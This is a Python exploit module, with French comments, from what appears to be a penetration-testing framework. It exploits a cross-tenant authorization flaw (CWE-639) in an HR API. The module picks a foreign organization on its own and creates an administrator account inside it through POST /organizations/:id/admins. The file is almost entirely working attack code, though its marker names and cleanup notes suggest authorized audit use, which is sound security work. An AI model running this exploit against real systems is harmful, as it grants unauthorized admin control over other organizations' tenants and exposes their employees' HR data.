"""HRAPI-2026-005 — création d'un compte admin dans un autre tenant."""

from __future__ import annotations
import time
from .base import Module, Option, Context


class Exploit(Module):
    id = "HRAPI-2026-005"
    name = "organizations/cross_tenant_admin_create"
    cwe = "CWE-639"
    cvss = "9.1 (Critique)"
    description = (
        "POST /organizations/:id/admins verifie la permission mais pas que :id "
        "est l'organisation de l'appelant. Preuve : creation d'un compte admin "
        "dans une autre organisation. Necessite user:manage."
    )
    options = {
        "org": Option(help="id de l'organisation cible (sinon auto)"),
        "email": Option(help="e-mail du compte a creer (sinon genere)"),
        "newpass": Option(default="Audit-Marker-123!", help="mot de passe du compte"),
    }

    def run(self, ctx: Context) -> bool:
        access = ctx.store.get("ACCESS")
        if not access:
            ctx.fail("Pas de session. Lance d'abord HRAPI-2026-001.")
            return False

        org = self.opt(ctx.store, "org")
        if not org:
            orgs = ctx.store.get("ORGS", [])
            mine = ctx.store.get("SESSION_ORG")
            target = next((o for o in orgs if o.get("id") != mine), None)
            if not target:
                ctx.fail("Aucune org cible. 'set org <id>' ou lance HRAPI-2026-003.")
                return False
            org = target.get("id")
            ctx.info(f"Org cible auto : {target.get('name')} ({org})")

        # On n'utilise PAS l'e-mail global (cible de 001) : compte distinct et tracable.
        email = self.values.get("email") or f"audit-marker-{int(time.time())}@example.test"
        payload = {
            "email": email,
            "password": self.opt(ctx.store, "newpass"),
            "firstName": "Audit",
            "lastName": "Marker",
        }
        res = ctx.client.add_org_admin(access, org, payload)
        created = res.get("data", {})
        if created.get("id"):
            ctx.ok(f"Compte admin cree dans un autre tenant : {email} (id={created.get('id')})")
            ctx.info(f"Role attribue : {created.get('systemRole')} — appartenance non verifiee.")
            ctx.store.setdefault("ARTIFACTS", []).append(("User", created.get("id")))
            ctx.info("Artefact a nettoyer (voir 'sessions').")
            return True
        ctx.fail(f"Creation refusee : {res}")
        return False
